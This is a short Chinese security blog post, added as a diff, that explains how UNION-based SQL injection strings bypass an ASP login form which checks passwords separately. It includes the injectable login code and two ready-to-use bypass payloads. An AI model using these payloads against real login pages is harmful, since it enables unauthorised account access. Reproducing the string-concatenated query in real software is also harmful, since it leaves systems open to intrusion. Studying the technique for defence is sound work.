@@ -1,0 +1,54 @@
+---
+layout: post
+status: publish
+published: true
+title: 万能的登陆验证代码
+author: Byronlee
+author_login: ginchenorlee
+author_email: ginchenorlee@sina.com
+wordpress_id: 29
+wordpress_url: http://www.ginchenorlee.com/?p=29
+date: !binary |-
+  MjAxMi0wNi0wNCAxMTo1MDo1MyArMDAwMA==
+date_gmt: !binary |-
+  MjAxMi0wNi0wNCAxMTo1MDo1MyArMDAwMA==
+categories:
+- 信息安全
+tags: []
+comments: []
+---
+<p>最近有网友提到一种新的万能登陆密码。比如网上有很多这样的登陆验证代码：<br />
+程序代码<span style="text-align: justify;">　</span></p>
+<pre class="brush: actionscript3; gutter: true">&lt;%
+
+username=trim(Request.Form(&quot;username&quot;))
+password=trim(Request.Form(&quot;password&quot;))
+sql=&quot;Select * FROM admin Where user=&#039;&quot;&amp;username&amp;&quot;&#039;&quot;
+Set rs=Server.CreateObject(&quot;adodb.recordset&quot;)
+rs.Open sql,conn,1,1
+if rs.eof then
+  checksysUser=FALSE
+else
+  passwd=trim(rs(&quot;pwd&quot;))
+if passwd=password then
+   Session(&quot;admin&quot;)=username
+   checksysUser=TRUE
+else
+  checksysUser=FALSE
+end if
+End if
+rs.close
+conn.close
+if checksysUser=true then
+  Response.Redirect(&quot;main.asp&quot;)
+else
+   errmsg=&quot;&lt;font color=#FF0000&gt;&lt;b&gt;用户名输入有误，请重新输入！&lt;/b&gt;&lt;/font&gt;&quot;
+end if
+%&gt;</pre>
+<p>先在数据库中查询用户名对应的密码，然后再和用户输入的密码对比，导致'or'='or'这样的万能登陆密码失效。</p>
+<p>但如果在上面的程序中，用户名输入 程序代码</p>
+<pre class="brush: actionscript3; gutter: true">&#039; UNION Select 1,1,1 FROM admin Where &#039;&#039;=&#039;</pre>
+<p>，密码输入1，就可以登陆成功，原理很简单，就不多说了。</p>
+<p>顺便附上oldjun的语句：</p>
+<p>程序代码</p>
+<pre class="brush: actionscript3; gutter: true">&#039; UNION Select 1,1,1 AS pwd FROM admin Where &#039;&#039;=&#039;</pre>
